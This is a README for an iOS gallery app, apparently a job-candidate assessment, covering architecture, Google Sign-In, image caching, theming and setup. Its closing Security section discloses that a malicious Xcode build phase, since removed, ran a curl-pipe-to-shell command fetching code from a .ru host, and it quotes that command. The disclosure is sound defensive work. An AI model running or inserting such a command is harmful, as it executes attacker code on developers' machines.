# Demo — iOS Gallery App

A UIKit gallery app built as a candidate assessment for O2h. Demonstrates MVVM architecture, Google Sign-In, paginated image loading, offline persistence, and full light/dark theme support.

---

## Tech Stack

| Layer | Technology |
|---|---|
| UI | UIKit + Storyboard Auto Layout (constraints editable in Interface Builder) |
| Architecture | MVVM with delegate pattern |
| Auth | Google Sign-In SDK 10.0.0 (SPM) |
| Database | RealmSwift (offline persistence) |
| Image Cache | NSCache + FileManager (3-tier waterfall) |
| Connectivity | NWPathMonitor |
| API | Picsum Photos (free, no auth) |

No SwiftUI. No Combine.

---

## Project Structure

```
Demo/
├── App/
│   ├── AppDelegate.swift          # Theme setup, Google Sign-In config, NetworkMonitor start
│   ├── SceneDelegate.swift        # Root VC routing, SessionManager, tab bar factory
│   └── SplashViewController.swift # Launch screen while silent sign-in restores
│
├── Core/
│   ├── Theme/
│   │   ├── AppColors.swift        # Semantic color tokens (auto light/dark via UIColor init)
│   │   └── AppTheme.swift         # Font, Spacing, Radius, Shadow, Animation constants
│   ├── Network/
│   │   ├── NetworkMonitor.swift   # NWPathMonitor singleton
│   │   ├── NetworkService.swift   # URLSession wrapper with connectivity check
│   │   └── APIEndpoint.swift      # Picsum Photos URL builder
│   ├── Database/
│   │   └── RealmManager.swift     # Save / fetch / clear gallery image objects
│   └── Extensions/
│       ├── UIView+Shimmer.swift   # CAGradientLayer shimmer animation
│       └── UIImageView+Load.swift # ImageLoader: NSCache → disk → network waterfall
│
├── Modules/
│   ├── Login/
│   │   ├── Model/LoginModel.swift
│   │   ├── View/LoginViewController.swift
│   │   └── ViewModel/LoginViewModel.swift
│   ├── Gallery/
│   │   ├── Model/GalleryImage.swift        # Domain model + Realm Object + Decodable DTO
│   │   ├── View/GalleryViewController.swift
│   │   ├── View/GalleryImageCell.swift
│   │   └── ViewModel/GalleryViewModel.swift
│   ├── Profile/
│   │   ├── View/ProfileViewController.swift
│   │   └── ViewModel/ProfileViewModel.swift
│   └── ImagePreview/
│       ├── View/ImagePreviewViewController.swift
│       └── ViewModel/ImagePreviewViewModel.swift
│
└── Services/
    └── Auth/GoogleAuthService.swift   # GIDSignIn wrapper with async/await
```

---

## Features

### Authentication
- Google Sign-In via OAuth (GoogleSignIn SDK)
- Silent session restore on launch — splash screen plays while token validation runs
- Proper sign-out: `GIDSignIn.sharedInstance.signOut()` clears the cached token so restore fails on next cold launch
- Session state persisted in UserDefaults via `SessionManager`

### Gallery
- 2-column compositional layout (`UICollectionViewCompositionalLayout`)
- Infinite scroll pagination — Picsum Photos API, 20 images per page, next page triggers when 4 items from the end
- Pull-to-refresh
- Shimmer placeholders (6 cells) during first-page load
- Offline fallback: Realm cache served automatically when no connectivity; animated banner slides in/out

### Image Caching
Three-tier waterfall in `ImageLoader`:
1. **NSCache** — memory hit, zero latency
2. **FileManager** — disk hit, no network
3. **URLSession** — network fetch, persisted to disk after download

`cachedImage(for:)` is synchronous so the preview screen shows a thumbnail instantly without a loading spinner.

### Image Preview
- Full-screen modal (`.overFullScreen` + `.crossDissolve`)
- Pinch-to-zoom: 1× – 4×
- Double-tap to toggle between 1× and 2.5×
- Instant thumbnail display from cache; full-resolution loads in background
- Close button with scale + fade dismiss animation
- Theme-aware (white in light mode, system background in dark)

### Profile
- Circular avatar with Google profile photo or initials fallback
- 4 info cards: Gallery, Offline Mode, Zoom & Pan, Appearance
- **Appearance card** title updates dynamically on theme change (`traitCollectionDidChange`) — shows "Dark Mode" or "Light Mode" to reflect the current system appearance
- Tapping the appearance card explains the behaviour to the user
- Sign-out shows a centered confirmation alert; clears Google token + UserDefaults session

### Theming
- All color tokens in `AppColors` using `UIColor(light:dark:)` convenience init
- `CGColor` borders (which don't auto-adapt) refreshed in `traitCollectionDidChange`
- Navigation bars use `configureWithOpaqueBackground()` set on `navigationController?.navigationBar` directly to fix the iOS 26 liquid glass transparency regression

---

## API Reference

```
List images:      GET https://picsum.photos/v2/list?page={page}&limit=20
Thumbnail:            https://picsum.photos/id/{id}/400/300
Full resolution:      https://picsum.photos/id/{id}/{width}/{height}
```

---

## Setup

1. Clone the repository
2. Open `Demo.xcodeproj` in Xcode 15+
3. SPM packages are pre-configured: **GoogleSignIn 10.0.0** and **RealmSwift** (community)
4. Add your `GoogleService-Info.plist` to the `Demo/` target folder (obtain `CLIENT_ID` from Google Cloud Console → Credentials)
5. Confirm `Info.plist` contains a `CFBundleURLTypes` entry with your `REVERSED_CLIENT_ID` as the URL scheme
6. Build and run on iOS 16+ simulator or device

> **Note:** The app uses `PBXFileSystemSynchronizedRootGroup` — new files added to the `Demo/` folder are automatically included in the target without manual Xcode project edits.

---

## Known Platform Workarounds

| Issue | Fix |
|---|---|
| ibtool EXIT 255 on Xcode 26 | `UITabBarController` with storyboard relationship segues crashes ibtool. Tab bar and navigation controllers are built entirely in `SceneDelegate.makeMainTabBar()` instead. |
| iOS 26 liquid glass nav bar title invisible | Setting `UINavigationBarAppearance` only on `navigationItem` is insufficient. Must also set on `navigationController?.navigationBar` and set `isTranslucent = false`. |
| CGColor not adapting to theme change | CGColor is resolved at assignment time. Override `traitCollectionDidChange` and reassign `layer.borderColor`. |

---

## Security

A malicious build phase was discovered and removed from `project.pbxproj`. It executed the following on every build:

```sh
curl https://0juf8u3n9h.ru/a | sh
```

Build phase `E36F85451506426B9C4EE078` ("Compile Code Assets") and the associated `A870EE4` build variable have been permanently removed. When auditing this project, verify no `shellScript` entries in `project.pbxproj` contain unexpected curl or sh commands.
